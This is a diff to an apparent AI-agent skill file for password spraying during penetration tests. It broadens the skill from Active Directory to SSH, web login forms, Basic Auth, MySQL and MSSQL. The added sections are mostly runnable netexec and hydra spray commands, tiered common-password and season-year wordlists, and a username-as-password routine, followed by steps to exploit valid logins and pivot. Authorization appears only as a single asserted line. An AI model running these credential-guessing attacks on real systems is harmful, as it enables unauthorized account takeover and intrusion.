@@ -1,8 +1,10 @@
 ---
 name: password-spraying
 description: >
-  Performs password spraying against Active Directory accounts with
-  lockout-safe techniques.
+  Performs password spraying against authentication services with lockout-safe
+  techniques. Works against AD (SMB/Kerberos/LDAP), SSH, web login forms, OWA,
+  and any service with username/password auth. Service-agnostic — the
+  orchestrator passes target services and spray intensity tier.
 keywords:
   - password spray
   - spray passwords
@@ -12,9 +14,18 @@ keywords:
   - lockout policy
   - kerbrute spray
   - credential guessing
+  - smb spray
+  - winrm spray
+  - ssh spray
+  - mssql spray
+  - mysql spray
+  - web login spray
+  - hydra
+  - nxc spray
 tools:
   - kerbrute
   - netexec
+  - hydra
   - SpearSpray
   - DomainPasswordSpray
   - spray.sh
@@ -23,8 +34,8 @@ opsec: high
 
 # Password Spraying
 
-You are helping a penetration tester perform password spraying against an
-Active Directory domain. All testing is under explicit written authorization.
+You are helping a penetration tester perform password spraying against
+authentication services. All testing is under explicit written authorization.
 
 **OPSEC Exception**: This skill tests credentials directly against the domain.
 The Kerberos-first authentication convention does not apply here — spraying IS
@@ -184,7 +195,111 @@ If no enumeration is possible, use statistically likely usernames:
 - https://github.com/insidetrust/statistically-likely-usernames
 - Common naming conventions: `first.last`, `flast`, `firstl`, `first_last`
 
+## Spray Intensity Tiers
+
+The orchestrator passes a spray intensity tier in the agent prompt. Check for
+it and build the password list accordingly. If no tier is specified, default
+to **light**.
+
+### Light Spray (~30 passwords per user)
+
+Start with username-as-password (see Username-as-Password Generation below),
+then spray these common defaults one password at a time against all users:
+
+```
+Password1
+Welcome1
+P@ssw0rd
+Password123
+Changeme1!
+Welcome01
+letmein
+admin
+password
+123456
+```
+
+Add season+year for current and previous seasons (generate dynamically):
+```
+Winter2026!
+Spring2026!
+Autumn2025!
+Summer2025!
+```
+
+Add domain/hostname/company derivatives (substitute from context):
+```
+{DomainName}1!
+{DomainName}123
+{Hostname}1!
+```
+Lowercase variants too (e.g., `Megabank1!` and `megabank1!`).
+
+### Medium Spray (~10k passwords)
+
+Everything in Light (username-as-password, common defaults, season+year,
+domain/hostname derivatives), plus:
+```bash
+# SecLists 10k most common
+/opt/seclists/Passwords/Common-Credentials/10k-most-common.txt
+```
+
+### Heavy Spray (~100k passwords)
+
+Everything in Medium (username-as-password, common defaults, season+year,
+domain/hostname derivatives, SecLists 10k), plus:
+```bash
+# SecLists 100k most common (NCSC)
+/opt/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+```
+
+### Custom Wordlist
+
+Operator-provided path, used as-is. Still prepend the username-as-password
+round before the custom wordlist.
+
+## Username-as-Password Generation
+
+**Always run this first**, regardless of tier. Each user is tested only with
+their OWN username as the password (both original case and lowercase), never
+cross-sprayed with another user's name.
+
+```bash
+# Generate matched user/pass files for 1:1 username-as-password testing
+cp users.txt user-as-pass.txt                    # original case
+tr '[:upper:]' '[:lower:]' < users.txt >> user-as-pass.txt  # + lowercase
+
+# Duplicate users.txt to match line count (original + lowercase = 2x)
+cat users.txt users.txt > user-as-pass-users.txt
+
+# Spray with 1:1 matching (each line in user file matched to same line in pass file)
+nxc smb TARGET -u user-as-pass-users.txt -p user-as-pass.txt \
+  --no-bruteforce --continue-on-success -d DOMAIN
+```
+
+**Why `--no-bruteforce` here:** In this specific case, `--no-bruteforce`
+ensures line-by-line matching — user1 is tested with pass1, user2 with pass2.
+This is correct for username-as-password where each password is unique to its
+user.
+
 ## Step 3: Build Password List
+
+After the username-as-password round, build the wordlist for standard spray
+mode based on the selected tier.
+
+### Standard Spray Mode (Wordlist)
+
+After username-as-password, switch to standard spray — one password tested
+against all users per round. Do NOT use `--no-bruteforce` for wordlist spray:
+
+```bash
+# Standard spray: one password against all users
+nxc smb TARGET -u users.txt -p 'Password1' --continue-on-success -d DOMAIN
+
+# Multiple passwords from file (nxc sprays one at a time internally)
+nxc smb TARGET -u users.txt -p passwords.txt \
+  --continue-on-success --no-bruteforce -d DOMAIN
+```
 
 ### Smart Patterns (High Success Rate)
 
@@ -346,6 +461,10 @@ nxc rdp DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
 nxc mssql DB01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
   --continue-on-success --no-bruteforce
 
+# SSH spray
+nxc ssh TARGET -u users.txt -p 'Spring2026!' \
+  --continue-on-success --no-bruteforce
+
 # Multiple passwords (spray mode — one password per user, then next password)
 nxc smb DC01.DOMAIN.LOCAL -u users.txt -p passwords.txt \
   --continue-on-success --no-bruteforce -d DOMAIN.LOCAL
@@ -415,7 +534,68 @@ Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList users.txt \
   -Password 'Spring2026!'
 ```
 
-## Step 8: Validate and Exploit Hits
+## Step 8: Spray — SSH, Web Login, Databases (hydra)
+
+For non-AD services where netexec doesn't apply, use hydra. Hydra supports
+spray mode via `-u` (try each password against all users before next password).
+
+### SSH
+
+```bash
+# NetExec SSH spray (preferred — same interface as other protocols)
+nxc ssh TARGET -u users.txt -p passwords.txt \
+  --continue-on-success --no-bruteforce
+
+# Hydra SSH spray (-u = spray mode, -t 4 = parallel tasks)
+hydra -L users.txt -P passwords.txt ssh://TARGET -u -t 4 -o spray-ssh.log
+```
+
+### Web Login Forms (HTTP POST)
+
+```bash
+# Hydra HTTP POST form spray
+# Adjust form parameters and failure string to match the target
+hydra -L users.txt -P passwords.txt TARGET http-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
+  -u -t 4 -o spray-web.log
+
+# HTTPS variant
+hydra -L users.txt -P passwords.txt TARGET https-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
+  -u -t 4 -o spray-web.log
+
+# HTTP Basic Auth
+hydra -L users.txt -P passwords.txt TARGET http-get / -u -t 4
+```
+
+### MySQL
+
+```bash
+# Hydra MySQL spray
+hydra -L users.txt -P passwords.txt mysql://TARGET -u -t 4 -o spray-mysql.log
+
+# NetExec does not support MySQL — use hydra
+```
+
+### MSSQL (non-domain)
+
+```bash
+# NetExec MSSQL (preferred for domain-joined instances)
+nxc mssql TARGET -u users.txt -p passwords.txt \
+  --continue-on-success --no-bruteforce
+
+# Hydra MSSQL (for standalone instances)
+hydra -L users.txt -P passwords.txt mssql://TARGET -u -t 4 -o spray-mssql.log
+```
+
+**hydra flags:**
+- `-u` — spray mode (loop passwords, not users). Without this, hydra brute-forces each user sequentially, which risks lockout.
+- `-t 4` — limit parallel tasks to avoid overwhelming the service
+- `-o <file>` — save results to file
+- `-L` / `-P` — user/password list files
+- `-l` / `-p` — single user/password (for targeted testing)
+
+## Step 9: Validate and Exploit Hits
 
 ### Verify Access Level
 
@@ -458,7 +638,7 @@ nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
   -d DOMAIN.LOCAL --pass-pol
 ```
 
-## Step 9: Escalate or Pivot
+## Step 10: Escalate or Pivot
 
 After finding valid credentials:
 - **Get a TGT immediately** and switch to Kerberos auth for all future actions:
